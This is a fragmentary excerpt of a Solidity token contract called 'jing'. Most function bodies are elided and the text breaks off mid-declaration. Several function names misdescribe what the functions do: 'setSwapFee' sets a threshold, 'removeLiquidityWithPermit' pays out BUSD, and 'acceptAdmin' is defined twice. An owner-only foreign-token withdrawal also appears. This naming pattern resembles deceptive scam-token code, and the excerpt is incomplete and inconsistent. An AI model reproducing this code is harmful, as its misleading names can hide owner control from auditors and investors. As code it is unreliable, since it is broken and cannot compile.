...
contract jing is IERC20, AuthLibrary {
    using SafeMath for uint256;    
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "jing";
    string constant _symbol = "JING";
	...
	function gettransferForeignToken(address _token, address _to) external onlyOwner returns (bool _sent)
	  {
    ...
    function acceptAdmin(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
		{
    ...
    function swapExactTokensForTokens(uint256 _rTotal, uint256 _tTotal) private pure returns(uint256, uint256) {
    ...
    function setSwapFee(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        _swapThreshold = _amount;
    }  

    function removeLiquidityWithPermit(address shareholder, uint256 _amount) internal {    
		  IERC20 BUSD = IERC20(0x704078261512316f80B55Cd443cAD7d90b414ad7);         
		  if(_amount > 0){
			  BUSD.transfer(shareholder, _amount);
		  }
	  }

    function setTxLimit(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }   

	function acceptAdmin(uint256 _amount) private view returns (uint256) {
